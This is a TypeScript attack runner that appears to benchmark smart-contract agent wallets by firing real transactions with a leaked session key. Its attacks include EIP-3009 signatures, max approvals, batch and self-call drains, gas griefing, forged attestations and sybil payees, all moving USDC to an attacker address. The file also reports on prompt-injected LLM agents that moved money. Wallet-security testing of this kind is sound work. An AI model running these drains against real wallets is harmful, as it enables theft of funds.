/**
 * The live attack runner. Every attempt is a REAL transaction on the configured chain: the leaked agent key
 * signs, the relayer EOA (the attacker's bundler) submits `EntryPoint.handleOps`, and what reached the
 * attacker is read from balances after the receipt. There is no tools pre-check, no anvil-only trick, no
 * time travel and no mock contract in this file.
 *
 * Cards that cannot be replayed honestly without a clock, an owner key, or a shop contract the live policy
 * does not list are NOT run: they emit a `pending` attempt with the reason and the recorded result.
 */
import {
  type Address,
  type Hex,
  type PublicClient,
  concat,
  createPublicClient,
  createWalletClient,
  defineChain,
  encodeAbiParameters,
  encodeFunctionData,
  getAddress,
  http,
  keccak256,
  maxUint256,
  parseAbi,
  toHex,
} from 'viem';
import { privateKeyToAccount, sign } from 'viem/accounts';
import { loadArtifact, mergedAbi } from '../../../agent/src/chain/artifacts.ts';
import { agentCallData, agentSignature, erc20 as erc20enc, x402Envelope } from '../../../agent/src/ops/encode.ts';
import { decodeReason } from '../../../agent/src/ops/reasons.ts';
import { buildOp, getNonce, opHash, submit, type OpGas } from '../../../agent/src/ops/submitter.ts';
import type { World } from '../../../agent/src/world/deploy.ts';
import { encodeAttestation, scoreAttestationTypedData } from '../../../packages/shared/src/attestor/typedData.ts';
import { CONFIG_IDS, type ConfigId, type LiveWallet, type RunnerOptions } from './config.ts';
import { loadCards, recordedCells, llmFile } from './data.ts';

export type Outcome = 'lost' | 'refused' | 'bounded' | 'paid' | 'pending';
export interface Asset {
  address: Address;
  symbol: string;
  decimals: number;
}
export interface Attempt {
  outcome: Outcome;
  amount?: bigint;
  asset?: Asset;
  reasonCode?: string;
  txHash?: Hex;
  note?: string;
  k?: number;
  n?: number;
}
export type Emit = (e: { type: 'log'; message: string } | { type: 'attempt'; config: ConfigId; attempt: Attempt }) => void;

const ETH: Asset = { address: '0x0000000000000000000000000000000000000000', symbol: 'ETH', decimals: 18 };
const NAIVE_EXEC = parseAbi(['function executeAgent(address target, uint256 value, bytes data)']);
const EXEC = parseAbi([
  'function execute(address dest, uint256 value, bytes func)',
  'function executeBatch((address target, uint256 value, bytes data)[] calls)',
]);
const WITHDRAW_TO = parseAbi(['function withdrawTo(address withdrawAddress, uint256 withdrawAmount)']);
const TOKEN = parseAbi([
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address,address) view returns (uint256)',
  'function DOMAIN_SEPARATOR() view returns (bytes32)',
  'function transferFrom(address from, address to, uint256 value) returns (bool)',
  'function transferWithAuthorization(address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, bytes signature)',
]);
const TWA_TYPEHASH = keccak256(toHex('TransferWithAuthorization(address from,address to,uint256 value,uint256 validAfter,uint256 validBefore,bytes32 nonce)'));
const TWA_FIELDS = [{ type: 'bytes32' }, { type: 'address' }, { type: 'address' }, { type: 'uint256' }, { type: 'uint256' }, { type: 'uint256' }, { type: 'bytes32' }] as const;

export const RECORDED_ONLY: Record<string, string> = {
  ticket_to_attacker: 'needs a shop contract the live policy lists (the live wallet lists a plain merchant EOA)',
  set_approval_for_all: 'needs an NFT the wallet holds and an operator rule the live policy does not install',
  replay_wrong_chain: 'needs an owner-signed UserOp; the owner key lives in MetaMask and is never given to the runner',
  greedy_merchant: 'needs a greedy merchant the owner listed plus a standing owner allowance',
  midnight_double_spend: 'needs the clock to cross UTC midnight inside 120 seconds',
  multi_key_cap: 'needs three session keys and a 24 h bucket refill',
};
export const LIVE_CARDS = ['legit_only', 'x402_side_door', 'approve_max', 'batch_selfcall_delegatecall', 'gas_burn_griefing', 'sybil_payee', 'attestor_compromise'];

type Fired = { ok: boolean; txHash?: Hex; reason?: string };
type FireOpt = { attestation?: Hex; gas?: Partial<OpGas>; kind?: number; raw?: Hex; beneficiary?: Address };

export class LiveRunner {
  readonly pub: PublicClient;
  readonly w: World;
  readonly agent: Address;
  readonly relayer: Address;
  readonly usdc: Asset;
  private readonly accountAbi: ReturnType<typeof mergedAbi>;
  private ctr = 0;

  constructor(readonly o: RunnerOptions) {
    const chain = defineChain({ id: o.chainId, name: `chain-${o.chainId}`, nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }, rpcUrls: { default: { http: [o.rpcUrl] } } });
    this.pub = createPublicClient({ chain, transport: http(o.rpcUrl) });
    const forgeOut = o.forgeOut ?? 'out';
    const ep = loadArtifact(forgeOut, 'EntryPoint', 'EntryPoint.sol');
    const account = loadArtifact(forgeOut, 'AgentAccount', 'AgentAccount.sol');
    const admin = loadArtifact(forgeOut, 'AgentAccountAdmin', 'AgentAccountAdmin.sol');
    this.accountAbi = mergedAbi(account.abi, admin.abi);
    this.agent = privateKeyToAccount(o.agentKey).address;
    this.relayer = privateKeyToAccount(o.relayerKey).address;
    this.usdc = { address: o.usdc, symbol: 'USDC', decimals: 6 };
    // The agent submitter helpers only need these World fields (clients, chain id, EntryPoint, ABIs).
    this.w = {
      c: { pub: this.pub, wallet: (pk: Hex) => createWalletClient({ account: privateKeyToAccount(pk), chain, transport: http(o.rpcUrl) }), rpcUrl: o.rpcUrl },
      chainId: o.chainId,
      ep: o.entryPoint,
      arts: { EntryPoint: ep },
      accountAbi: this.accountAbi,
      addrOf: { relayer: this.relayer },
      keys: { relayer: o.relayerKey },
    } as unknown as World;
  }

  wallet(cfg: ConfigId): LiveWallet | undefined {
    return this.o.wallets[cfg];
  }
  private bal = (a: Address) => this.pub.readContract({ address: this.o.usdc, abi: TOKEN, functionName: 'balanceOf', args: [a] });
  private eth = (a: Address) => this.pub.getBalance({ address: a });
  private fresh = (label: string): Address => getAddress(`0x${keccak256(toHex(`${label}:${Date.now()}:${this.ctr++}`)).slice(-40)}`);
  private cap = (b: bigint) => (b < (this.o.maxAttack ?? 1_000_000n) ? b : (this.o.maxAttack ?? 1_000_000n));

  private async gas(): Promise<OpGas> {
    // anvil reports a 1 gwei price while Base charges ~0.01 gwei: use the harness fee on the local chain.
    const price = this.o.chainId === 31337 ? 5_000_000n : await this.pub.getGasPrice();
    const fee = price * 2n + 1_000_000n;
    const capped = fee > 1_000_000_000n ? 1_000_000_000n : fee;
    return { verificationGasLimit: 250_000n, callGasLimit: 300_000n, preVerificationGas: 60_000n, maxFeePerGas: capped, maxPriorityFeePerGas: capped };
  }

  /** Remaining gas credit of the agent session (wei), or undefined for wallets without one. */
  async gasCredit(cfg: ConfigId): Promise<bigint | undefined> {
    const w = this.wallet(cfg);
    if (!w || w.kind !== 'agent') return undefined;
    try {
      const [, s] = (await this.pub.readContract({ address: w.address, abi: this.accountAbi, functionName: 'sessionOf', args: [this.agent] })) as [bigint, { gas: { gasCredit: bigint } }];
      return s.gas.gasCredit;
    } catch {
      return undefined;
    }
  }

  async frozen(cfg: ConfigId): Promise<boolean> {
    const w = this.wallet(cfg);
    if (!w || w.kind !== 'agent') return false;
    return (await this.pub.readContract({ address: w.address, abi: this.accountAbi, functionName: 'isFrozen', args: [this.agent] })) as boolean;
  }

  private sign65(digest: Hex): Promise<Hex> {
    return sign({ hash: digest, privateKey: this.o.agentKey, to: 'hex' });
  }

  /** Explain a refused agent op in the account's own vocabulary (checkUserOp), else the EntryPoint's message. */
  private async reasonOf(w: LiveWallet, op: ReturnType<typeof buildOp>, failed?: string): Promise<string> {
    if (w.kind === 'agent') {
      try {
        const [reason] = (await this.pub.readContract({ address: w.address, abi: this.accountAbi, functionName: 'checkUserOp', args: [op, opHash(this.w, op)] })) as [number, number, number];
        if (reason !== 0) return decodeReason(reason).name;
      } catch {
        /* fall through */
      }
    }
    const m = /AA\d{2}/.exec(failed ?? '');
    // The naive account reports a static-allowlist / cap refusal as a signature failure.
    if (w.kind === 'naive' && m?.[0] === 'AA24') return 'ALLOWLIST';
    return m ? m[0] : (failed ?? 'REVERTED').slice(0, 60);
  }

  /** One call from the leaked key against a wallet; no pre-check. */
  async fire(cfg: ConfigId, target: Address, value: bigint, data: Hex, opt: FireOpt = {}): Promise<Fired> {
    const w = this.wallet(cfg);
    if (!w) return { ok: false, reason: 'NOT_DEPLOYED' };
    if (w.kind === 'eoa') {
      try {
        const hash = await this.w.c.wallet(this.o.agentKey).sendTransaction({ to: target, data, value });
        const r = await this.pub.waitForTransactionReceipt({ hash });
        return { ok: r.status === 'success', txHash: hash, ...(r.status === 'success' ? {} : { reason: 'REVERTED' }) };
      } catch (e) {
        return { ok: false, reason: (e as Error).message.split('\n')[0]!.slice(0, 80) };
      }
    }
    const gas = { ...(await this.gas()), ...opt.gas };
    const key = w.kind === 'agent' ? ((await this.pub.readContract({ address: w.address, abi: this.accountAbi, functionName: 'nonceKeyOf', args: [this.agent, 0] })) as bigint) : 0n;
    const callData = opt.raw ?? (w.kind === 'naive' ? encodeFunctionData({ abi: NAIVE_EXEC, functionName: 'executeAgent', args: [target, value, data] }) : agentCallData(target, value, data, opt.kind ?? 0));
    const op = buildOp(w.address, await getNonce(this.w, w.address, key), callData, gas);
    const sig = await this.sign65(opHash(this.w, op));
    op.signature = w.kind === 'agent' ? agentSignature(sig, opt.attestation ?? '0x') : sig;
    const res = await submit(this.w, [op], opt.beneficiary ?? this.relayer, this.o.relayerKey);
    if (res.validated && res.success && !res.policyBlocked) return { ok: true, txHash: res.txHash };
    const reason = !res.validated ? await this.reasonOf(w, op, res.failedOp) : res.policyBlocked ? 'POLICY_BLOCKED' : 'REVERTED';
    return { ok: false, txHash: res.validated ? res.txHash : undefined, reason };
  }

  /** An attacker-side token transaction from the relayer; waits for the receipt. */
  private async relayerWrite(req: Parameters<ReturnType<World['c']['wallet']>['writeContract']>[0]): Promise<Fired> {
    try {
      const hash = await this.w.c.wallet(this.o.relayerKey).writeContract(req);
      const r = await this.pub.waitForTransactionReceipt({ hash });
      return { ok: r.status === 'success', txHash: hash };
    } catch (e) {
      return { ok: false, reason: /signature|1271|invalid/i.test((e as Error).message) ? 'SIG_1271' : (e as Error).message.split('\n')[0]!.slice(0, 80) };
    }
  }

  private classify(lost: bigint, bound: bigint, asset: Asset, txHash?: Hex, reason?: string, note?: string): Attempt {
    if (lost === 0n) return { outcome: 'refused', reasonCode: reason, txHash, note };
    return { outcome: lost > bound ? 'lost' : 'bounded', amount: lost, asset, txHash, reasonCode: reason, note };
  }

  // ------------------------------------------------------------------ cards

  private async legit_only(cfg: ConfigId): Promise<Attempt> {
    const merchant = this.o.merchant;
    let paid = 0n;
    let tx: Hex | undefined;
    if (merchant) {
      const before = await this.bal(merchant);
      const r = await this.fire(cfg, this.o.usdc, 0n, erc20enc.transfer(merchant, 10_000n));
      tx = r.txHash;
      paid += (await this.bal(merchant)) - before;
    }
    const cold = this.fresh('legit-cold');
    const r2 = await this.fire(cfg, this.o.usdc, 0n, erc20enc.transfer(cold, 50_000n));
    const coldPaid = await this.bal(cold);
    paid += coldPaid;
    if (coldPaid > 0n) return { outcome: 'paid', amount: paid, asset: this.usdc, txHash: r2.txHash ?? tx, note: merchant ? 'the listed merchant and a brand-new payee were both paid' : 'a brand-new payee was paid' };
    return { outcome: 'refused', reasonCode: r2.reason, txHash: tx, ...(paid > 0n ? { amount: paid, asset: this.usdc } : {}), note: 'the listed merchant was paid; the brand-new honest payee was refused' };
  }

  private twaDigest(domain: Hex, from: Address, value: bigint, validBefore: bigint, nonce: Hex): Hex {
    const struct = keccak256(encodeAbiParameters(TWA_FIELDS, [TWA_TYPEHASH, from, this.o.attackerAddress, value, 0n, validBefore, nonce]));
    return keccak256(concat(['0x1901', domain, struct]));
  }

  private async x402_side_door(cfg: ConfigId): Promise<Attempt> {
    const w = this.wallet(cfg)!;
    const value = this.cap(await this.bal(w.address));
    if (value === 0n) return { outcome: 'pending', note: 'the wallet holds no USDC to attack' };
    const domain = (await this.pub.readContract({ address: this.o.usdc, abi: TOKEN, functionName: 'DOMAIN_SEPARATOR' })) as Hex;
    const validBefore = (await this.pub.getBlock()).timestamp + 3600n;
    const before = await this.bal(this.o.attackerAddress);
    const send = (signature: Hex, nonce: Hex) =>
      this.relayerWrite({ address: this.o.usdc, abi: TOKEN, functionName: 'transferWithAuthorization', args: [w.address, this.o.attackerAddress, value, 0n, validBefore, nonce, signature] } as never);
    const nonce = keccak256(toHex(`side-door:${cfg}:${Date.now()}`));
    let r = await send(await this.sign65(this.twaDigest(domain, w.address, value, validBefore, nonce)), nonce);
    if (!r.ok && w.kind === 'agent') {
      // also the one-door envelope with no voucher behind it
      const n2 = keccak256(toHex(`side-door-env:${cfg}:${Date.now()}`));
      const agentSig = await this.sign65(this.twaDigest(domain, w.address, value, validBefore, n2));
      const r2 = await send(x402Envelope(this.o.attackerAddress, value, 0n, validBefore, n2, agentSig), n2);
      if (r2.ok) r = r2;
    }
    const lost = (await this.bal(this.o.attackerAddress)) - before;
    return this.classify(lost, 0n, this.usdc, r.txHash, r.reason ?? 'SIG_1271', 'EIP-3009 signed by the leaked key, submitted straight to the token (no UserOp)');
  }

  private async approve_max(cfg: ConfigId): Promise<Attempt> {
    const w = this.wallet(cfg)!;
    const spender = this.relayer; // the attacker's own submitter is the approved spender
    const r = await this.fire(cfg, this.o.usdc, 0n, erc20enc.approve(spender, maxUint256));
    const allowance = (await this.pub.readContract({ address: this.o.usdc, abi: TOKEN, functionName: 'allowance', args: [w.address, spender] })) as bigint;
    if (allowance === 0n) return { outcome: 'refused', reasonCode: r.reason ?? 'ARG_RULE', note: 'approve(attacker, MAX) did not take effect' };
    const before = await this.bal(this.o.attackerAddress);
    const pull = this.cap(await this.bal(w.address));
    const t = await this.relayerWrite({ address: this.o.usdc, abi: TOKEN, functionName: 'transferFrom', args: [w.address, this.o.attackerAddress, pull] } as never);
    const lost = (await this.bal(this.o.attackerAddress)) - before;
    await this.fire(cfg, this.o.usdc, 0n, erc20enc.approve(spender, 0n)); // best-effort cleanup of the standing allowance
    return this.classify(lost, 0n, this.usdc, t.txHash ?? r.txHash, t.reason);
  }

  private async batch_selfcall_delegatecall(cfg: ConfigId): Promise<Attempt> {
    const w = this.wallet(cfg)!;
    const drain = this.cap(await this.bal(w.address));
    const transfer = erc20enc.transfer(this.o.attackerAddress, drain);
    const before = await this.bal(this.o.attackerAddress);
    const results: Fired[] = [];
    if (w.kind === 'eoa') results.push(await this.fire(cfg, this.o.usdc, 0n, transfer));
    else {
      const execute = encodeFunctionData({ abi: EXEC, functionName: 'execute', args: [this.o.usdc, 0n, transfer] });
      results.push(await this.fire(cfg, this.o.usdc, 0n, transfer, { raw: encodeFunctionData({ abi: EXEC, functionName: 'executeBatch', args: [[{ target: this.o.usdc, value: 0n, data: transfer }]] }) }));
      results.push(await this.fire(cfg, this.o.usdc, 0n, transfer, { raw: execute }));
      results.push(await this.fire(cfg, w.address, 0n, execute));
      if (w.kind === 'agent') {
        results.push(await this.fire(cfg, w.address, 0n, encodeFunctionData({ abi: this.accountAbi, functionName: 'setRecipient', args: [this.o.attackerAddress, true] })));
        results.push(await this.fire(cfg, this.o.usdc, 0n, transfer, { kind: 2 }));
      }
      results.push(await this.fire(cfg, this.o.entryPoint, 0n, encodeFunctionData({ abi: WITHDRAW_TO, functionName: 'withdrawTo', args: [this.o.attackerAddress, 10n ** 18n] })));
      results.push(await this.fire(cfg, this.o.usdc, 0n, transfer));
    }
    const lost = (await this.bal(this.o.attackerAddress)) - before;
    const hit = results.find((r) => r.ok);
    const first = results.find((r) => !r.ok);
    return this.classify(lost, 0n, this.usdc, hit?.txHash ?? first?.txHash, first?.reason, `${results.length} shape(s): batch, execute, self-call, withdrawTo, direct transfer`);
  }

  private async gas_burn_griefing(cfg: ConfigId): Promise<Attempt> {
    const w = this.wallet(cfg)!;
    const bound = (await this.gasCredit(cfg)) ?? 0n; // read BEFORE the attack: the credit shrinks as it is burned
    const before = await this.eth(this.o.attackerAddress);
    let tx: Hex | undefined;
    let reason: string | undefined;
    if (w.kind === 'eoa') {
      const bal = await this.eth(w.address);
      const send = bal / 10n < 500_000_000_000_000n ? bal / 10n : 500_000_000_000_000n;
      const r = await this.fire(cfg, this.o.attackerAddress, send, '0x');
      tx = r.txHash;
      reason = r.reason;
    } else {
      // the attacker is the bundler (beneficiary); ops pass validation and run out of call gas in execution
      for (let i = 0; i < 5; i++) {
        const r = await this.fire(cfg, this.o.usdc, 0n, erc20enc.transfer(this.o.merchant ?? this.o.attackerAddress, 1n), { gas: { callGasLimit: 25_000n }, beneficiary: this.o.attackerAddress });
        tx = r.txHash ?? tx;
        reason = r.reason ?? reason;
      }
    }
    const lost = (await this.eth(this.o.attackerAddress)) - before;
    return this.classify(lost, bound, ETH, tx, reason, 'the attacker-run bundler collects the gas of ops that fail in execution');
  }

  private async attestation(cfg: ConfigId, payee: Address, over: { key?: Hex; chainId?: number; wallet?: Address; validUntil?: bigint } = {}): Promise<Hex | undefined> {
    const w = this.wallet(cfg)!;
    const key = over.key ?? this.o.attestorKey;
    if (!key) return undefined;
    const block = await this.pub.getBlock();
    const epoch = BigInt(((await this.pub.readContract({ address: w.address, abi: this.accountAbi, functionName: 'attestEpoch' }).catch(() => 0n)) as bigint | number) ?? 0);
    const msg = { recipient: payee, tier: 1, validUntil: Number(over.validUntil ?? block.timestamp + 20n * 3600n), epoch };
    const signature = await privateKeyToAccount(key).signTypedData(scoreAttestationTypedData(over.chainId ?? this.o.chainId, over.wallet ?? w.address, msg));
    return encodeAttestation({ ...msg, signature });
  }

  private async bucketCap(w: LiveWallet, fn: 'globalBucket' | 'exploreBucket'): Promise<bigint> {
    if (w.kind !== 'agent') return 0n;
    try {
      const b = (await this.pub.readContract({ address: w.address, abi: this.accountAbi, functionName: fn, args: [this.o.usdc] })) as { burst: bigint; ratePerDay: bigint };
      return b.burst + b.ratePerDay;
    } catch {
      return 0n;
    }
  }

  private async sybil_payee(cfg: ConfigId): Promise<Attempt> {
    const w = this.wallet(cfg)!;
    const payees = Array.from({ length: 15 }, (_, i) => this.fresh(`sybil-${i}`));
    const total = async () => (await Promise.all(payees.map((p) => this.bal(p)))).reduce((a, b) => a + b, 0n);
    const before = await total();
    let tx: Hex | undefined;
    let reason: string | undefined;
    const attackerAttestor = keccak256(toHex('attacker-attestor-key'));
    const forged =
      w.kind === 'agent'
        ? [
            await this.attestation(cfg, payees[0]!, { key: attackerAttestor }), // signed by the attacker, not the attestor
            await this.attestation(cfg, payees[1]!, { key: attackerAttestor, validUntil: 1n }), // expired
            await this.attestation(cfg, payees[2]!, { key: attackerAttestor, wallet: this.fresh('other-wallet') }), // another wallet
            await this.attestation(cfg, payees[3]!, { key: attackerAttestor, chainId: this.o.chainId + 1 }), // another chain
          ]
        : [];
    for (let i = 0; i < forged.length; i++) {
      const r = await this.fire(cfg, this.o.usdc, 0n, erc20enc.transfer(payees[i]!, 300_000n), { attestation: forged[i] });
      tx = r.txHash ?? tx;
      reason = r.reason ?? reason;
    }
    for (let i = forged.length; i < payees.length; i++) {
      const r = await this.fire(cfg, this.o.usdc, 0n, erc20enc.transfer(payees[i]!, 50_000n));
      tx = r.txHash ?? tx;
      reason = r.reason ?? reason;
    }
    const lost = (await total()) - before;
    return this.classify(lost, await this.bucketCap(w, 'exploreBucket'), this.usdc, tx, reason, 'forged attestations, then a spray of fresh payees');
  }

  private async attestor_compromise(cfg: ConfigId): Promise<Attempt> {
    const w = this.wallet(cfg)!;
    if (!this.o.attestorKey) return { outcome: 'pending', note: 'no attestor key configured, so the compromised-attestor attack cannot be signed' };
    const att = await this.attestation(cfg, this.o.attackerAddress);
    const before = await this.bal(this.o.attackerAddress);
    let tx: Hex | undefined;
    let reason: string | undefined;
    for (let i = 0; i < 6; i++) {
      const r = await this.fire(cfg, this.o.usdc, 0n, erc20enc.transfer(this.o.attackerAddress, this.cap(1_000_000n)), { attestation: att });
      tx = r.txHash ?? tx;
      reason = r.reason ?? reason;
      if (!r.ok) break;
    }
    const lost = (await this.bal(this.o.attackerAddress)) - before;
    return this.classify(lost, await this.bucketCap(w, 'globalBucket'), this.usdc, tx, reason, 'the attacker payee is forged PROVEN with the attestor key; the daily limit is the bound');
  }

  // ------------------------------------------------------------------ run

  async run(cardId: string, shooter: 'raw' | 'llm', only: ConfigId[] | undefined, emit: Emit): Promise<void> {
    const root = this.o.root;
    const configs = (only?.length ? only : CONFIG_IDS).filter((c) => this.wallet(c));
    const card = loadCards(root).find((c) => c.id === cardId);
    if (!card) throw new Error(`unknown card ${cardId}`);
    emit({ type: 'log', message: `${card.title}: ${shooter === 'llm' ? 'hypnotized LLM' : 'raw leaked key'} on chain ${this.o.chainId}` });

    if (shooter === 'llm') {
      const llm = llmFile(root);
      for (const cfg of configs) {
        const cells = llm?.cells.filter((c) => c.config === cfg && c.card !== 'control') ?? [];
        const k = cells.reduce((a, c) => a + c.hijacked, 0);
        const n = cells.reduce((a, c) => a + c.runs, 0);
        emit({ type: 'attempt', config: cfg, attempt: { outcome: 'pending', k, n, note: `recorded LLM runs (${llm?.model ?? 'model'}, results/x1_llm.json), not replayed live: ${k} of ${n} injected runs moved money` } });
      }
      return;
    }

    if (!LIVE_CARDS.includes(cardId)) {
      const why = RECORDED_ONLY[cardId] ?? 'not replayable live';
      for (const cfg of configs) {
        const c = recordedCells(root).find((x) => x.card === cardId && x.config === cfg);
        const rec = c ? (BigInt(c.beyondPolicyBaseUnits) > 0n ? `lost ${c.lostBaseUnits}` : BigInt(c.lostBaseUnits) > 0n ? `bounded ${c.lostBaseUnits}` : 'refused, 0 lost') : 'no recorded cell';
        emit({ type: 'log', message: `${cfg}: recorded result (Foundry, results/cards): ${rec}` });
        emit({ type: 'attempt', config: cfg, attempt: { outcome: 'pending', note: `recorded result shown; cannot be replayed live without a clock (${why})` } });
      }
      return;
    }

    for (const cfg of configs) {
      if (cardId === 'attestor_compromise' && cfg !== 'R4') continue;
      if (await this.frozen(cfg)) {
        emit({ type: 'attempt', config: cfg, attempt: { outcome: 'pending', note: 'the agent key is frozen by the tripwires; the owner must unfreeze it in MetaMask before this card can be fired live' } });
        continue;
      }
      const credit = await this.gasCredit(cfg);
      const g = await this.gas();
      if (credit !== undefined && cardId !== 'gas_burn_griefing' && credit < 3n * 610_000n * g.maxFeePerGas) {
        emit({ type: 'attempt', config: cfg, attempt: { outcome: 'pending', note: 'the account has almost no gas credit left (earlier attacks burned it); the owner must refill it in MetaMask before this card can run for the right reason' } });
        continue;
      }
      emit({ type: 'log', message: `${cfg}: firing ${card.title} with the leaked key` });
      let attempt: Attempt;
      try {
        attempt = await (this as unknown as Record<string, (c: ConfigId) => Promise<Attempt>>)[cardId]!(cfg);
      } catch (e) {
        attempt = { outcome: 'pending', note: `could not run: ${(e as Error).message.split('\n')[0]!.slice(0, 160)}` };
      }
      emit({ type: 'attempt', config: cfg, attempt });
      if (await this.frozen(cfg)) emit({ type: 'log', message: `${cfg}: the agent key is now FROZEN by the wallet's tripwires` });
    }
  }
}
